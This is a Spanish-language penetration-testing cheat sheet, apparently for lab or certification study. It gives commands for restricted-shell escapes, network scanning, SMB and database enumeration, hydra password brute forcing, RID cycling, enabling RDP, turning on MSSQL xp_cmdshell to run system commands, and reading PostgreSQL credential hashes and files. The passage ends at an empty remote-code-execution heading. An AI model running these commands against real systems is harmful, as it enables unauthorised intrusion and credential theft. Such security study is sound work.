- [🎯 Flags de userAccountControl AD](#-flags-de-useraccountcontrol-ad)
- [Pivoting](#pivoting)
- [Information Gathering](#information-gathering)
- [Web](#web)
- [Bases de datos](#bases-de-datos)
- [Passwords Attacks](#passwords-attacks)
- [Wordlists](#wordlists)
- [Active Directory](#active-directory)
- [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
- [Recursos y Blogs](#recursos-y-blogs)

<!-- /TOC -->

##  1. <a name='comandos'></a>Comandos

###  1.1. <a name='linux'></a>Linux

####  1.1.1. <a name='crunch'></a>Crunch

```bash
crunch 6 6 -t Lab%%% > wordlist
```

####  1.1.2. <a name='escapar-de-una-restricted-shell'></a>Escapar de una Restricted Shell

```bash
ssh user@10.0.0.3 -t "/bin/sh"
ssh user@10.0.0.3 -t "bash --noprofile"
ssh user@10.0.0.3 -t "(){:;}; /bin/bash"

# Vim
:set shell=/bin/bash
:shell

# more, less, man, ftp, gdb
'! /bin/sh'
'!/bin/sh'
'!bash'

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find
find / -name offsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Python
exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()

# Perl
exec "/bin/sh";

# Ruby
exec "/bin/sh"

# Lua
os.execute('/bin/sh')
```

####  1.1.3. <a name='configuración-de-fecha-y-hora'></a>Configuración de Fecha y Hora

```bash
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

###  1.2. <a name='windows'></a>Windows

####  1.2.1. <a name='habilitar-winrm'></a>Habilitar WinRM

```powershell
winrm quickconfig
```

####  1.2.2. <a name='-habilitar-rdp'></a> Habilitar RDP

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

##  2. <a name='docker'></a>Docker

```bash
docker run                  # Corre un commando dentro de un contenedor a partir de una imágen
docker run -d               # Corre un commando dentro de un contenedor a partir de una  imágen en background (-d detached)).
docker exec                 # Ejecuta un comando dentro de un contenedor que se encuentra corriendo.
docker pull                 # Descarga una imágen
docker push                 # Sube una imágen
docker tag                  # Agrega un tag (etiqueta) a una imágen
docker images               # Lista las imagenes
docker ps                   # Lista los contenedores
docker start <id_container> # Inicializa un contenedor
docker stop  <id_container> # Detiene un contenedor
docker logs  <id_container> # Muestra el log del contenedor
docker login                # Permite iniciar sesión en dockerhub
docker build                # Construye una imágen a partir de un Dockerfile
docker network              # Permite crear una red
```

##  3. <a name='information-gathering'></a>Information Gathering

###  3.1. <a name='fping'></a>Fping

####  3.1.1. <a name='identificación-de-hosts'></a>Identificación de hosts

```bash
fping -asgq 172.16.0.1/24
```

Parámetros utilizados:

- `a` para mostrar los objetivos que están activos

- `s` imprimir estadísticas al final de la exploración

- `g` para generar una lista de destinos a partir de la red CIDR

- `q` para no mostrar resultados por objetivo

Con el escaneo realizado anteriormente con fping podemos armar una lista de hosts activos.

###  3.2. <a name='nmap'></a>Nmap

####  3.2.1. <a name='descubrimiento-de-host---ping-scan'></a>Descubrimiento de host - Ping Scan

```bash
sudo nmap -sn <TARGET-RANGE>

# Ejemplo
sudo nmap -sn 192.168.56.1/24
```

- `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.

####  3.2.2. <a name='escaneo-de-puertos'></a>Escaneo de puertos

```bash
sudo nmap -p- --open -Pn -n <RHOST> -oG openPorts -vvv
```

Parámetros utilizados:

- `-sS`: Realiza un TCP SYN Scan para escanear de manera sigilosa, es decir, que no completa las conexiones TCP con los puertos de la máquina víctima.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `--open`: Muestra solo los puertos que están abiertos, excluyendo los cerrados.
- `--min-rate 5000`: Establece el número mínimo de paquetes que nmap enviará por segundo.
- `-Pn`: Desactiva la detección de hosts (no realiza un ping previo). Esto es útil si el host tiene el ICMP (ping) bloqueado.
- `-n`: Desactiva la resolución de nombres DNS, lo que acelera el escaneo porque no intenta resolver las direcciones IP a nombres de dominio.
- `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

####  3.2.3. <a name='versión-y-servicio'></a>Versión y Servicio

```bash
sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv 
```

- `-sCV` Es la combinación de los parámetros `-sC` y `-sV`. El primero determina que se utilizarán una serie de scripts básicos de enumeración propios de nmap, para conocer el servicio que esta corriendo en dichos puertos. Por su parte, segundo parámetro permite conocer más acerca de la versión de ese servicio.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

####  3.2.4. <a name='udp-(top-100)'></a>UDP (top 100)

```bash
sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast <RHOST>
```

####  3.2.5. <a name='udp-(top-20)'></a>UDP (top 20)

```bash
sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 <RHOST>
```

####  3.2.6. <a name='obtener-ayuda-sobre-scripts'></a>Obtener ayuda sobre scripts

```bash
nmap --script-help="http-*"
```

####  3.2.7. <a name='listar-scripts-de-nmap'></a>Listar scripts de Nmap

```bash
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
###  3.3. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos

####  3.3.1. <a name='descubrimiento-de-hosts-windows'></a>Descubrimiento de hosts Windows

```powershell
arp -d
for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
arp -a
```
####  3.3.2. <a name='descubrimiento-de-hosts-linux'></a>Descubrimiento de hosts Linux

```bash
for i in $(seq 1 254); do ping -c 1 192.168.50.$i &>/dev/null && echo "[+] Host 192.168.50.$i - ACTIVE"; done
```

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')

for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 $octetos.$i" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done; wait
```

```bash
./hostDiscovery.sh 192.168.56
```
####  3.3.3. <a name='descubrimiento-de-hosts-linux-(alternativa)'></a>Descubrimiento de hosts Linux (alternativa)

Si la máquina no cuenta con la utilidad `ping`, podemos utilizar el siguiente script como alternativa:

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')
 
for i in $(seq 1 254); do
    timeout 1 bash -c "echo >/dev/tcp/$octetos.$i/80" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done
wait
```

```bash
./hostDiscovery.sh 192.168.56
```
####  3.3.4. <a name='descubrimiento-de-puertos-abiertos-linux'></a>Descubrimiento de puertos abiertos Linux

```bash
#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/$1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
./portDiscovery.sh <RHOST>
```
###  3.4. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos

```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
```

```bash
echo $TOP_200 | tr ',' '\n' | xargs -P 500 -I {} proxychains nmap -sT -p{} --open -T5 -Pn -n <RHOST> 2>&/dev/null | grep "tcp open" | tee open_ports.txt
echo $TOP_500 | tr ',' '\n' | xargs -P 500 -I {} proxychains nmap -sT -p{} --open -T5 -Pn -n <RHOST> 2>&/dev/null | grep "tcp open" | tee open_ports.txt
echo $TOP_1000 | tr ',' '\n' | xargs -P 500 -I {} proxychains nmap -sT -p{} --open -T5 -Pn -n <RHOST> 2>&/dev/null | grep "tcp open" | tee open_ports.txt
```

##  4. <a name='servicios-comunes'></a>Servicios Comunes

###  4.1. <a name='ftp-(21)'></a>FTP (21)

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos entre sistemas que están conectados a una red TCP/IP, basado en una arquitectura *cliente-servidor*. Este protocolo permite la transmisión eficiente de archivos a través de la red, proporcionando servicios de autenticación y control de acceso.

Por defecto, el puerto asignado para la comunicación FTP es el puerto 21.
####  4.1.1. <a name='nmap-1'></a>Nmap

Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.

- `anonymous:anonymous`
- `anonymous`
- `ftp:ftp`

```bash
sudo nmap -sCV -p21 <RHOST> -vvv
```

Scripts de `nmap` utiles para este servicio:

- ftp-anon
- ftp-bounce
- ftp-syst
- ftp-brute
- tftp-version

```bash
sudo nmap -p21 --script=ftp-anon <RHOST> -vvv
```

####  4.1.2. <a name='conexión-al-servidor-ftp'></a>Conexión al servidor FTP

```bash
# -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
# el modo ASCII  de transferencia de archivos. En este modo, los archivos se 
# transfieren en formato de texto, lo que significa que se pueden realizar 
# conversiones de formato (por ejemplo, de CRLF a LF en sistemas Unix).
ftp -A <RHOST>

nc -nvc <RHOST> 21

telnet <RHOST> 21
```

####  4.1.3. <a name='interactuar-con-el-cliente-ftp'></a>Interactuar con el cliente FTP

```bash
ftp> anonymous # usuario
ftp> anonymous # contraseña
ftp> help # mostrar la ayuda
ftp> help CMD # mostrar la ayuda de un comando especifico
ftp> status # descripción general de la configuración del servidor
ftp> binary # establecer la transmisión en binario en lugar de ascii
ftp> ascii # establecer la transmisión a ascii en lugar de binario
ftp> ls -a # lista todos los archivos incluyendo los ocultos
ftp> cd DIR # cambia el directorio remoto
ftp> lcd DIR # cambia el directorio local
ftp> pwd # mostrar el directorio actual de trabajo
ftp> cdup  # mover al directorio anterior de trabajo
ftp> mkdir DIR # crea un directorio
ftp> get FILE [NEWNAME] # descarga un archivo con el nombre indicado NEWNAME
ftp> mget FILE1 FILE2 ... # descarga multiples archivos
ftp> put FILE [NEWNAME] # sube un fichero local a el servidor ftp con el nuevo nombre indicado NEWNANE
ftp> mput FILE1 FILE2 ... # sube multiples archivos
ftp> rename OLD NEW # renombra un archivo remoto
ftp> delete FILE # borra un fichero
ftp> mdelete FILE1 FILE2 ... # borra multiples archivos
ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
ftp> exit # abandona la conexión ftp
```

####  4.1.4. <a name='netexec'></a>Netexec

```bash
nxc ftp <RHOST> -u <USER> -p <PASSWORD>
nxc ftp <RHOST> -u 'anonymous' -p ''
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --port <PORT>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --ls <DIRECTORY>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --get <FILE>
nxc ftp <RHOST> -u <USER> -p <PASSWORD> --put <FILE>
```
####  4.1.5. <a name='fuerza-bruta-de-credenciales'></a>Fuerza bruta de credenciales

```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
```

####  4.1.6. <a name='archivos-de-configuración'></a>Archivos de configuración

- `/etc/ftpusers`
- `/etc/vsftpd.conf`
- `/etc/ftp.conf`
- `/etc/proftpd.conf`

####  4.1.7. <a name='descargar-archivos'></a>Descargar archivos

```bash
wget -m ftp://anonymous:anonymous@<RHOST>
```
###  4.2. <a name='smb-(445)'></a>SMB (445)

SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).

- SMB utiliza el puerto 445 (TCP). Sin embargo, originalmente, SMB se ejecutaba sobre NetBIOS utilizando puerto 139.
    
- SAMBA es una implementación de código abierto para Linux del protocolo SMB (Server Message Block), que facilita la interoperabilidad entre sistemas Linux y Windows. Permite a los equipos con Windows acceder a recursos compartidos en sistemas Linux, y a su vez, posibilita que dispositivos Linux accedan a recursos compartidos en redes Windows.

El protocolo SMB utiliza dos niveles de autenticación, a saber:

- **Autenticación de usuario**: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse con el servidor SMB para acceder a un recurso compartido.
    
- **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.

####  4.2.1. <a name='nmap-2'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- smb-ls
- smb-protocols
- smb-security-mode
- smb-enum-sessions
- smb-enum-shares
- smb-enum-users    
- smb-enum-groups    
- smb-enum-domains    
- smb-enum-services

Sintaxis:

```bash
sudo nmap -p445 --script <script> <RHOST>
```
####  4.2.2. <a name='smbclient'></a>smbclient

Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.

```bash
# Lista recursos compartidos
smbclient -L <RHOST> -N

# Conexión utilizando una sesión nula
smbclient //<RHOST>/Public -N

# Realiza una conexión con el usuario elliot
smbclient //<RHOST>/Public -U elliot
```

####  4.2.3. <a name='smbmap'></a>smbmap

SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.

```bash
# Utiliza un usuario de invitado (guest) con una contraseña en blanco para 
# autenticarse en el objetivo especificado por <RHOST>.
# -d indica el dominio actual.
smbmap -u guest -p "" -d . -H <RHOST>

# Autentica con un usuario y contraseña específicos (<USER> y <PASSWORD>) 
# en el objetivo (<RHOST>).
# -L lista los recursos compartidos disponibles en la máquina.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -L

# Autentica en el objetivo y muestra la lista de archivos y 
# carpetas en la unidad C$ de forma recursiva.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -r 'C$'

# Autentica y sube un archivo desde la ubicación local /root/file
# al recurso compartido C$ en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --upload '/root/file' 'tmp/file'

# Autentica y descarga el archivo 'file' desde el recurso compartido tmp 
# en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --download 'tmp/file'

# Autentica en el objetivo y ejecuta el comando ipconfig en el sistema remoto 
# usando SMB.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -x 'ipconfig'
```

####  4.2.4. <a name='enum4linux'></a>enum4linux

Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.

```bash
# -o indica que se realizará una enumeración básica.
enum4linux -o <RHOST>

# -U indica que se realizará una enumeración de usuarios
enum4linux -U <RHOST>

# -G indica que se realizará una enumeración de grupos 
enum4linux -G <RHOST>

# -S indica que se realizará una enumeración de los recursos compartidos
enum4linux -S <RHOST>

# -i Comprueba si el servidor smb esta configurado para imprimir
enum4linux -i <RHOST>

# -r Intentará enumerar usuarios utilizando RID cycling en el sistema remoto.
# -u Especifica el nombre de usuario que se utilizará para la autenticación. 
# -p Especifica la contraseña asociada al usuario proporcionado con la opción -u.
enum4linux -r -u <user> -p <password> <RHOST>
```

####  4.2.5. <a name='netexec-1'></a>Netexec

Netexec, anteriormente conocido como **CrackMapExec (CME)**, es una herramienta de código. que permite automatizar tareas relacionadas con la enumeración y explotación de sistemas Windows y Linux, como la ejecución de comandos remotos, la obtención de credenciales y la evaluación de la seguridad en entornos de redes grandes. Netexec permite realizar tareas de forma masiva en múltiples sistemas a la vez, facilitando la identificación de vulnerabilidades y configuraciones incorrectas en una red.

```bash
# Enumerar hosts
nxc smb <RHOST>/24

# comprobar null sessions
nxc smb <RHOST> -u '' -p ''

# comprobar Guest login
nxc smb <RHOST> -u 'guest' -p ''

# enumerar hosts con firma SMB no requerida
nxc smb <RHOST>/24 --gen-relay-list relay_list.txt

# enumerar recursos compartidos usando una null session
nxc smb <RHOST> -u '' -p '' --shares

# enumerar recursos compartidos de lectura/escritura en múltiples IPs con/sin credenciales
nxc smb <RHOST> -u <USER> -p <PASSWORD> --shares --filter-shares READ WRITE

# enumera sesiones activas en la máquina objetivo
nxc smb <RHOST> -u <USER> -p <PASSWORD> --sessions

# enumera los discos duros
nxc smb <RHOST> -u <USER> -p <PASSWORD> --disks

# enumera las computadoras en el dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --computers

# enumera los usuaros logueados
nxc smb <RHOST> -u <USER> -p <PASSWORD> --loggedon-users

# enumera usuarios del dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --users

# enumera grupos del dominio
nxc smb <RHOST> -u <USER> -p <PASSWORD> --groups

# enumera los grupos locales de la máquina
nxc smb <RHOST> -u <USER> -p <PASSWORD> --local-group

# enumera usuarios por fuerza bruta de RID. Por defecto el valor de RID máximo es 4000.
nxc smb <RHOST> -u <USER> -p <PASSWORD> --rid-brute [MAX-RID]

# enumera la politica de contraseña
nxc smb <RHOST> -u <USER> -p <PASSWORD> --pass-pol

# emite la consulta WMI especificada
nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi

# WMI Namescape (default: root\cimv2)
nxc smb <RHOST> -u <USER> -p <PASSWORD> --wmi-namespace
```

####  4.2.6. <a name='rpcclient'></a>Rpcclient

Rpcclient es una utilidad que forma parte del conjunto de herramientas Samba. Se utiliza para interactuar con el protocolo Remote Procedure Call (RPC) de Microsoft, que se utiliza para la comunicación entre los sistemas basados en Windows y otros dispositivos. rpcclient se utiliza principalmente para fines de depuración y pruebas, y se puede utilizar para consultar y manipular sistemas remotos.

El protocolo SMB se utiliza principalmente para compartir archivos, impresoras y otros recursos en una red, pero también puede aprovechar RPC para ciertas funcionalidades y operaciones específicas.

Por ejemplo, cuando accedes a recursos compartidos en una red Windows, como carpetas compartidas o impresoras, estás utilizando el protocolo SMB. Sin embargo, para algunas operaciones administrativas y de gestión, como enumerar usuarios y grupos, modificar permisos de archivos o impresoras, o acceder a la configuración del sistema remoto, SMB puede utilizar RPC para realizar estas tareas.

Cuando utilizas herramientas como `rpcclient` para interactuar con un sistema remoto que ejecuta servicios SMB, estás esencialmente aprovechando el protocolo RPC subyacente que forma parte de la implementación de SMB en ese sistema. De esta manera, `rpcclient` puede actuar como una interfaz para realizar consultas y ejecutar comandos a través del protocolo RPC en el contexto de un servidor SMB.

```bash
# obtener información sobre el sistema remoto, como el nombre del servidor, 
# la versión del sistema operativo, el dominio de trabajo, la fecha y la hora del sistema, entre otros datos.
rpcclient -U "" -N <RHOST> -c "srvinfo"

# enumera los usuarios del dominio
rpcclient -U "" -N <RHOST> -c "enumdomusers"

# enumera los grupos del dominio
rpcclient -U "" -N <RHOST> -c "enumdomgroups"

# obtiene el SID del usuario en base a su nombre
rpcclient -U "" -N <RHOST> -c "lookupnames root"

# Se utiliza para enumerar los SID (Security Identifiers) asignados a los grupos 
# en un servidor remoto. Es útil para obtener información sobre los grupos de 
# seguridad disponibles en un sistema y sus respectivos SID.
rpcclient -U "" -N <RHOST> -c "lsaenumsid"

# Buscar posible información en la descripción del usuario
for user in $(cat ad_users.txt); do rpcclient -U '' -N megabank.local -c "queryuser $user"; done | grep -E "User Name|Description"
```

El parámetro `-c` en `rpcclient` se utiliza para especificar un comando o una secuencia de comandos que se ejecutarán en el servidor remoto una vez que se haya establecido la conexión. Esto permite realizar operaciones específicas de forma automática sin necesidad de interactuar manualmente con `rpcclient` después de establecer la conexión.

La sintaxis básica del parámetro `-c` es la siguiente:

```bash
rpcclient -U username //<RHOST> -c "command1; command2; command3"
```

####  4.2.7. <a name='rid-cycling-attack'></a>RID Cycling Attack

```bash
seq 1 5000 | xargs -P 50 -I{} rpcclient -U "" 30.30.30.4 -N -c "lookupsids S-1-22-1-{}" 2>&1
```

####  4.2.8. <a name='smb-desde-windows'></a>SMB desde Windows

```powershell
# listar recursos compartidos
net share

# borrar el recurso compartido
net use * \delete

# montar el recurso compartido
net use z: \\<RHOST>\c$ <password> /user:<username>

# /all nos permite ver los recursos compartidos administrativos (que terminan en '$').
# Puede usar IP o nombre de host para especificar el host.
net view \\<RHOST> /all
```

Recursos compartidos comunes en Windows:

- `C$` corresponde a C:/    
- `ADMIN$` se asigna a C:/Windows    
- `IPC$` se utiliza para RPC    
- `Print$` aloja controladores para impresoras compartidas    
- `SYSVOL` sólo en DCs    
- `NETLOGON` sólo en los DC

####  4.2.9. <a name='interactuar-con-el-cliente-smb'></a>Interactuar con el cliente SMB

```
smb: \> help # muestra la ayuda
smb: \> ls # listar archivos
smb: \> put file.txt # subir un archivo
smb: \> get file.txt # descargar un archivo
```

####  4.2.10. <a name='montar-una-recurso-compartido'></a>Montar una recurso compartido

```bash
mount -t cifs -o "username=user,password=password" //<RHOST>/share /mnt/share
```

####  4.2.11. <a name='fuerza-bruta-de-credenciales-1'></a>Fuerza bruta de credenciales

```bash
nmap --script smb-brute -p 445 <RHOST>
hydra -l admin -P /usr/share/wordlist/rockyou.txt <RHOST> smb
```

###  4.3. <a name='mysql-(3306)'></a>MYSQL (3306)

MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado para almacenar, gestionar y recuperar datos en diversas aplicaciones, desde sitios web hasta sistemas empresariales. MySQL es conocido por su alta performance, escalabilidad, y confiabilidad. Ofrece soporte para múltiples usuarios y transacciones simultáneas, y utiliza el lenguaje SQL (Structured Query Language) para la gestión de los datos. MySQL es compatible con numerosas plataformas y se integra fácilmente con lenguajes de programación como PHP, Java y Python.

####  4.3.1. <a name='nmap-3'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- mysql-empty-password    
- mysql-info    
- mysql-databases    
- mysql-users    
- mysql-variables    
- mysql-dump-hashes    
- mysql-audit    

```bash
# Comprobar si el password de `root` es vacío.
sudo nmap --script=mysql-empty-password -p 3306 <RHOST>

# Mostrar información del servidor de MySQL
sudo nmap --script=mysql-info -p 3306 <RHOST>

# Listar las base de datos
sudo nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Lista los usuarios de la base de datos
sudo nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

sudo nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Dump hashes
sudo nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <RHOST>

sudo nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" <RHOST> -vvv

# Ejecutar una consulta
sudo nmap -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" <RHOST> -vvv
```

####  4.3.2. <a name='fuerza-bruta'></a>Fuerza bruta

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST> mysql
```

####  4.3.3. <a name='comandos-básicos'></a>Comandos básicos

```mysql
SHOW DATABASES; # listar las bases de datos
USE <DATABASE>; # seleccionar una base de datos
SHOW TABLES; # listar las tablas de una base de datos
DESC <TABLE>; # mostar los campos de una tabla
SHOW CREATE TABLE; # mostrar la estructura de una tabla
SELECT <column_name>,<column_name>,<column_name...> FROM <TABLE>; # listar el contenido de una tabla
SHOW EVENTS; # mostrar los eventos programados
```

###  4.4. <a name='mssql-(1433)'></a>MSSQL (1433)

MSSQL, o Microsoft SQL Server, es un sistema de gestión de bases de datos relacional desarrollado por Microsoft. Es utilizado para almacenar y recuperar datos según las necesidades de diferentes aplicaciones, desde pequeñas a grandes empresas. MSSQL ofrece características avanzadas como soporte para transacciones, integridad referencial, seguridad robusta y herramientas de administración y desarrollo. Es conocido por su integración estrecha con otros productos de Microsoft, como .NET Framework y Azure, y utiliza T-SQL (Transact-SQL) como su lenguaje de consulta.

####  4.4.1. <a name='nmap-4'></a>Nmap

Scripts de `nmap` utiles para este servicio:

- ms-sql-info    
- ms-sql-ntlm-info    
- ms-sql-brute    
- ms-sql-empty-password    
- ms-sql-query    
- ms-sql-dump-hashes    
- ms-sql-xp-cmdshell

```bash
sudo nmap --script ms-sql-info -p 1433 <RHOST>

# Comprobar autenticación NTLM
sudo nmap --script ms-sql-ntlm-info --script-args mssql.instance-port 1433 <RHOST>

# Enumerar usuarios y contraseña validos para MSSQL
sudo nmap -p 1433 --script ms-sql-brute -script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <RHOST>

# Comprobar si el usuario "sa" tiene configurada la contraseña como vacía
sudo nmap -p 1433 --script ms-sql-empty-password <RHOST>

# Extraer todos los usuarios con sesión con una consulta sql
sudo nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-query="SELECT * FROM master..syslogins" <RHOST> -oN output.txt

# Ejecutar un comando en la máquina victima usando xp_cmdshell
sudo nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" <RHOST>
```

####  4.4.2. <a name='netexec-2'></a>Netexec

```bash
# Realiza una consulta SQL
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -q <SQL_QUERY>

# Ejecuta un comando en el sistema Windows si la opción `xp_cmdshell` esta habilitada para el usuario
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -x <COMMAND>

# Enumera los privilegios para escalar de un usuario estandar a sysadmin
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv

# Aproveche los privilegios de MSSQL para escalar de un usuario estándar a un sysadmin.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=privesc

# Revertir los privilegios del usuario al usuario estándar.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=rollback

# Obtener un archivo remoto de una carpeta compartida.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --get-file <REMOTE_FILENAME> <OUTPUT_FILENAME>

# Subir un archivo local en una ubicación remota
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --put-file <LOCAL_FILENAME> <REMOTE_FILENAME>
```
####  4.4.3. <a name='conexión'></a>Conexión

```powershell
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

```bash
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```bash
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN
```
####  4.4.4. <a name='comandos-básicos-1'></a>Comandos básicos

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```
####  4.4.5. <a name='mostrar-el-contenido-de-una-base-de-datos'></a>Mostrar el contenido de una base de datos

```sql
1> SELECT name FROM master.sys.databases
2> go
```

####  4.4.6. <a name='ejecución-de-código'></a>Ejecución de código

En MSSQL gracias a la palabra clave `execute`, podemos ejecutar el comando arbitrario en el sistema operativo. Para hacer eso primero tenemos que habilitar la ejecución del comando dentro de la base de datos de la siguiente forma:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

De esta forma, ya podemos ejecutar comandos:

```sql
EXECUTE xp_cmdshell 'whoami'
```
###  4.5. <a name='postgresql-(5432)'></a>PostgreSQL (5432)

```sql
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

####  4.5.1. <a name='comandos-comunes'></a>Comandos Comunes

```sql
postgres=# \list                                                            // listar todas las bases de datos
postgres=# \c                                                               // seleccionar una base de datos
postgres=# \c <DATABASE>                                                    // seleccionar una base de datos especifica
postgres=# \s                                                               // historial de comandos
postgres=# \q                                                               // salir
<DATABASE>=# \dt                                                            // listar las tablas del schema actual
<DATABASE>=# \dt *.*                                                        // listar las tablas de todos los schema
<DATABASE>=# \du                                                            // listar los roles de usuario
<DATABASE>=# \du+                                                           // listar los roles de usuario
<DATABASE>=# SELECT user;                                                   // mostar el usuario actual
<DATABASE>=# TABLE <TABLE>;                                                 // seleccionar una tabla
<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // Leer credenciales
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // Leer directorios
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // Leer un archivo
```

####  4.5.2. <a name='ejecución-remota-de-código'></a>Ejecución Remota de Código

